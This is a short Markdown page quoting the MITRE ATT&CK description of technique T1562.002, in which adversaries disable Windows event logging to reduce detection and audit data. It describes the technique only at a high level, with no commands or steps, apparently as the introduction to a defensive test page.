# T1562.002 - Disable Windows Event Logging
## [Description from ATT&CK](https://attack.mitre.org/techniques/T1562/002)
<blockquote>Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections.

Adversaries may targeting system-wide logging or just that of a particular application. By disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.</blockquote>
